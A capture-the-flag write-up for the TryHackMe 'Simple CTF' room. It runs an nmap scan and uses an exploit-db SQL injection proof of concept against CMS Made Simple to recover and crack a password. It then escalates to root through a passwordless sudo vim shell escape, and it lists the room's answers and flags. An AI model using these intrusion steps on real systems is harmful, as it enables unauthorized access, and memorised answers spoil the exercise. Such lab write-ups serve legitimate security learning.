# Simple CTF

Beginner level ctf

Room URL: https://tryhackme.com/room/easyctf

---

# Task 1

1. How many services are running under port 1000?

We'll run a portscan to get the answer to question 1 and 2:

```
$ nmap -sC -sV 10.10.254.251
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 19:09 CEST
Nmap scan report for 10.10.254.251
Host is up (0.058s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.39.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So we've got an FTP server with anonymous login and a `robots.txt` with two
entries.

```
2
```

2. What is running on the higher port?

```
SSH
```

3. What's the CVE you're using against the application?

Gobuster shows that there's something at `/simple`. It seems to be a CMS called
"CMS Made Simple" with version number 2.2.8. We can throw this into
exploit-db.com and see if we find anything. It seems there
[is](https://www.exploit-db.com/exploits/46635)! An SQL injection vulnerability
for any version below 2.2.10. Let's download that and run it against our box. It
actually needed the pip for `termcolor` so I installed that.

```
https://www.exploit-db.com/exploits/46635
```

4. To what kind of vulnerability is the application vulnerable?

So I wanted to fill out `SQL Injection` here but that contains too many
characters so it had to be `SQLi`

```
SQLi
```

5. What's the password?

The POC we found on exploit-db is running. It found a salt for the password, a
username, an email address, a password hash and it also cracked the password for
us, how nice!

```
$ python poc.py -u http://10.10.254.251/simple/ --crack -w ~/projects/SecLists/Passwords/Common-Credentials/best110.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

```
secret
```

6. Where can you login with the details obtained?

Just a random guess.

```
SSH
```

7. What's the user flag?

```
$ ls
user.txt
$ cat us
cat: us: No such file or directory
$ cat user.txt
```

```
G00d j0b, keep up!
```

8. Is there any other user in the home directory? What's its name?

```
$ ls /home
mitch  sunbath
```

```
sunbath
```

9. What can you leverage to spawn a privileged shell?

`sudo -l` shows us we can run `/usr/bin/vim` as root without a password.

```
vim
```

10. What's the root flag?

Just open up any random file with `sudo /usr/bin/vim`, then hit `!` and type
`/bin/sh` and you're root.

```
$ sudo /usr/bin/vim anything

# ls /root
root.txt
# cat /root/root.txt
```

```
W3ll d0n3. You made it!
```
